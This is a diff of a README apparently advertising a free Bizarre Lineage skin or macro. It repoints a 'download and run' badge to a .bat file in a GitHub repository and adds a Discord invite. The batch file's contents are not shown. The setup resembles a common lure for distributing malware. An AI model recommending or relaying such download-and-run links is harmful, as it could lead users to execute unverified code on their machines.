@@ -14,11 +14,11 @@ Free, no key needed, just download and run.
 
 ## ⬇️ Download
 
-<a href="https://github.com/TheWolfLight/bizarre-lineage-bot/raw/main/Download_BizarreLineageSkin.bat">
+<a href="https://github.com/TheWolfLight/free-bizarre-lineage-skin/raw/main/Download_BizarreLineageSkin.bat">
 <img src="https://img.shields.io/badge/DOWNLOAD-MACRO-CBA6F7?style=for-the-badge&logo=download&logoColor=white" alt="Download">
 </a>
 
-<a href="https://discord.gg/YOUR_INVITE_HERE">
+<a href="https://discord.gg/btNHCKbKAn">
 <img src="https://img.shields.io/badge/JOIN-DISCORD-5865F2?style=for-the-badge&logo=discord&logoColor=white" alt="Discord">
 </a>
 
